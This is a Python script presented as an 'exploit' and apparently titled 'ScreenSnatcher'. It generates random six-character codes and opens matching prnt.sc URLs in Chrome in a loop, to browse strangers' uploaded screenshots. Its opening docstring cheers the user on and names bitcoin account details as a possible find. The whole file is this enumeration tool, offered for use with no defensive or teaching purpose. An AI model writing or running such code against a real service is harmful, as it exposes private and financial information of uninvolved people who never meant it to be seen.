'''Thanks for choosing this exploit!
To use it close Chrome Browser and run the code,
and a random screenshot will appear from scrn.sc each
time, which could for instance be bitcoin account
details. Good luck, and happy exploiting :D'''

#Import assets
import webbrowser
import random
import time 

#Main function
def main():

    #Create 'code' variables
    rn1 = random.randint(1,9)
    rn2 = random.randint(1,9)
    rl1 = chr(random.randint(97,122))
    rl2 = chr(random.randint(97,122))
    rl3 = chr(random.randint(97,122))
    rl4 = chr(random.randint(97,122))

    #Define 'code' for URL
    code = str(rn1) + str(rn2) + rl1 + rl2 + rl3 + rl4
    
    #Open tab
    url = 'prnt.sc/' + code
    chrome_path = 'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe %s'
    webbrowser.get(chrome_path).open(url)

print("   _____                          _____            __       __             ")
print("  / ___/_____________  ___  ____ / ___/___  ____ _/ /______/ /_ ___  _____")
print("  \__ \/ ___/ ___/ _ \/ _ \/ __ \\__ \/ __ \/ __ `/ __/ ___/ __ \/ _ \/ ___/")
print(" ___/ / /__/ /  /  __/  __/ / / /__/ / / / / /_/ / /_/ /__/ / / /  __/ /    ")
print("/____/\___/_/   \___/\___/_/ /_/____/_/ /_/\__,_/\__/\___/_/ /_/\___/_/     ")


#Call main function
while True:
    print("\nHow many iterations of prnt.sc would you like to open?\n")
    amount = input()
    for i in range(0,int(amount)):
        main()
        time.sleep(0.1)
